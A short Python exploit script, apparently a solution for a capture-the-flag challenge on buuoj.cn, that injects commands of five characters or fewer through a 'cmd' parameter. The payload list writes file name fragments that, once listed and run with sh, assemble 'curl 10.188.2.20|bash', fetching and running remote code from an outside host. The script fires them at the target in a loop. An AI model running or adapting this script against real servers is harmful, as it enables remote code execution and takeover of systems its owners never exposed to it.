# 命令执行
import requests
from time import sleep



payload = [
    # generate `ls -t>g` file
    '>ls\\',
    'ls>_',
    '> \\',
    '>-t\\',
    '>>g',
    'ls>>_',

    # generate `curl orange.tw.tw|python`
    # generate `curl 10.188.2.20|bash`
    '>sh ',
    '>ba\\',
    '>|\\',
    '>6\\',
    '>9\\',
    '>1.\\',
    '>8\\',
    '>1.\\',
    '>4.\\',
    '>7\\',
    '>2.\\',
    '>11\\',
    '> \\',
    '>rl\\',
    '>cu\\',

    # exec
    'sh _',
    'sh g',
]



r = requests.get('http://26691546-ea5a-4296-9cf4-385df679792f.node4.buuoj.cn:81/?reset=1')
for i in payload:
    assert len(i) <= 5
    requests.get('http://26691546-ea5a-4296-9cf4-385df679792f.node4.buuoj.cn:81/?cmd=' + i)
    print(i)
    sleep(0.2)
